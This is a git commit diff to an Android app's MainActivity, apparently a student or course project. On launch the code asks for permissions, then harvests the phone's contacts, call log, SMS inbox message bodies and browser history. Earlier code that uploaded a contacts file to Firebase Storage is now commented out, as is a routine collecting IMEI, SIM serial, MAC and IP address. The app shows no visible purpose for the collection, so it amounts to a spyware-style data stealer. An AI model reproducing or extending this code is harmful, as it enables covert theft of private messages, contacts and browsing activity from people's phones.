59801ac3790d8f639ceac757d9b6921f0555b5bc
tuannd0510 <tuanabcxyz555@gmail.com>
2023-03-10 17:58:44 +0700

    get sms

--- pes2023/app/src/main/java/com/example/Modul6/MainActivity.java
+++ pes2023/app/src/main/java/com/example/Modul6/MainActivity.java
@@ -1,30 +1,21 @@
 package com.example.Modul6;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
-import android.content.ContentResolver;
+import android.Manifest;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 
 import android.os.Bundle;
 import android.util.Log;
-import android.widget.Toast;
-
-import com.google.android.gms.tasks.OnFailureListener;
-import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.firebase.storage.FirebaseStorage;
-import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -37,9 +28,25 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        setFileName();
-        getContact();
-        uploadFirebase();
+        // yeu cau quyen
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION }, 1);
+        }
+
+
+//        setFileName();
+
+        getContactList();
+        getCallDetails();
+        getSmsDetails();
+//        getDeviceInformation();
+        getHistoryWeb();
+//        uploadFirebase();
 
     }
 
@@ -51,81 +58,132 @@ public class MainActivity extends AppCompatActivity {
         File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
         file = new File(downloadsDirectory, fileName);
     }
+    private void uploadFirebase() {
+//        FirebaseStorage storage = FirebaseStorage.getInstance();
+//        // Create a storage reference from our app
+//        StorageReference storageRef = storage.getReference();
+//        // Create a reference to the file you want to upload
+//        StorageReference fileRef = storageRef.child(file.getName());
+//
+//        String filePath = file.getPath();
+//        Uri fileUri = Uri.fromFile(new File(filePath));
+//
+//
+//        // Upload file to Firebase Storage
+//        fileRef.putFile(fileUri)
+//                .addOnSuccessListener(taskSnapshot -> {
+//                    // File uploaded successfully
+//                    Log.d("uploadFirebase", "File uploaded successfully");
+//                })
+//                .addOnFailureListener(e -> {
+//                    // Handle unsuccessful uploads
+//                    Log.e("uploadFirebase", "Error uploading file", e);
+//                });
+    }
 
-    private void getContact() {
-        // Get the content resolver
-        ContentResolver resolver = getContentResolver();
-
-        // Define the projection (fields to retrieve)
-        String[] projection = new String[] {
-                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                ContactsContract.CommonDataKinds.Phone.NUMBER
-        };
-
-        // Define the selection (filter)
-        String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
-        String[] selectionArgs = null;
-
-        // Define the sort order
-        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
-
+    private void getContactList() {
         // Query the contacts
-        Cursor cursor = resolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                projection,
-                selection,
-                selectionArgs,
-                sortOrder
-        );
+        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
 
+        // Iterate over the cursor to retrieve the contacts
+        while (cursor.moveToNext()) {
+            // Retrieve the contact name and phone number
+            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-        // Open the file for writing
-        try {
-            FileWriter writer = new FileWriter(file);
-
-            // Iterate over the cursor to retrieve the contacts
-            while (cursor.moveToNext()) {
-                // Retrieve the contact name and phone number
-                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-
-                // Do something with the contact name and phone number
-                Log.d("getContact", "Name: " + name + ", Phone: " + phone);
-                // Write the contact name and phone number to the file
-                writer.write(name + ", " + phone + "\n");
-            }
-
-            // Close the file writer
-            writer.close();
-            // Close the cursor
-            cursor.close();
-        } catch (IOException e) {
-            e.printStackTrace();
+            // Do something with the contact name and phone number
+            Log.d("getContact", "Name: " + name + ", Phone: " + phone);
         }
 
+        // Close the cursor
+        cursor.close();
+    }
+    private void getCallDetails() {
+        // Lấy cursor để truy vấn lịch sử cuộc gọi
+        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+
+        // Iterate over the cursor to retrieve the contacts
+        while (cursor.moveToNext()) {
+            // Lấy thông tin cuộc gọi
+            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
+            String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
+            String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
+            String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
+
+            // Chuyển đổi định dạng ngày tháng
+            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
+            String dateString = formatter.format(new Date(Long.parseLong(date)));
+
+            // In thông tin cuộc gọi
+            Log.d("getmCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
+
+        }
+        // Đóng cursor
+        cursor.close();
 
     }
+    private void getSmsDetails() {
+        // Lấy cursor để truy vấn tin nhắn
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
-    private void uploadFirebase() {
-        FirebaseStorage storage = FirebaseStorage.getInstance();
-        // Create a storage reference from our app
-        StorageReference storageRef = storage.getReference();
-        // Create a reference to the file you want to upload
-        StorageReference fileRef = storageRef.child(file.getName());
+        // Iterate over the cursor to retrieve the contacts
+        while (cursor.moveToNext()) {
+            // Lấy thông tin tin nhắn
+            String address = cursor.getString(cursor.getColumnIndex("address"));
+            String body = cursor.getString(cursor.getColumnIndex("body"));
+            String date = cursor.getString(cursor.getColumnIndex("date"));
 
-        String filePath = file.getPath();
-        Uri fileUri = Uri.fromFile(new File(filePath));
+            // Chuyển đổi định dạng ngày tháng
+            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
+            String dateString = formatter.format(new Date(Long.parseLong(date)));
 
-
-        // Upload file to Firebase Storage
-        fileRef.putFile(fileUri)
-                .addOnSuccessListener(taskSnapshot -> {
-                    // File uploaded successfully
-                    Log.d("uploadFirebase", "File uploaded successfully");
-                })
-                .addOnFailureListener(e -> {
-                    // Handle unsuccessful uploads
-                    Log.e("uploadFirebase", "Error uploading file", e);
-                });
+            // In thông tin tin nhắn
+            Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
+        }
+        // Close the cursor
+        cursor.close();
     }
+
+    private void getHistoryWeb() {
+        // Lấy cursor để truy vấn lịch sử trình duyệt
+        Cursor cursor = getContentResolver().query(Uri.parse("content://browser/history"), null, null, null, null);
+
+        // Iterate over the cursor to retrieve the browsing history
+        while (cursor.moveToNext()) {
+            // Lấy thông tin trang web
+            String title = cursor.getString(cursor.getColumnIndex("title"));
+            String url = cursor.getString(cursor.getColumnIndex("url"));
+            String date = cursor.getString(cursor.getColumnIndex("date"));
+
+            // Chuyển đổi định dạng ngày tháng
+            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
+            String dateString = formatter.format(new Date(Long.parseLong(date)));
+
+            // In thông tin trang web
+            Log.d("getBrowserHistory", "Title: " + title + " URL: " + url + " Date: " + dateString);
+        }
+        // Đóng cursor
+        cursor.close();
+    }
+    private void getDeviceInformation() {
+//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+//        @SuppressLint("HardwareIds") String imei = telephonyManager.getDeviceId();
+//        @SuppressLint("HardwareIds") String simSerial = telephonyManager.getSimSerialNumber();
+//
+//        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+//        @SuppressLint("HardwareIds") String macAddress = wifiManager.getConnectionInfo().getMacAddress();
+//
+//        int ipAddress = wifiManager.getConnectionInfo().getIpAddress();
+//        String ip = String.format(Locale.getDefault(), "%d.%d.%d.%d",
+//                (ipAddress & 0xff), (ipAddress >> 8 & 0xff), (ipAddress >> 16 & 0xff), (ipAddress >> 24 & 0xff));
+//
+//        String osVersion = Build.VERSION.RELEASE;
+//
+//        // Log the device information
+//        Log.d("DeviceInfo", "IMEI: " + imei + ", SIM Serial: " + simSerial + ", MAC Address: " + macAddress + ", IP Address: " + ip + ", OS Version: " + osVersion);
+    }
+
+
+
 }
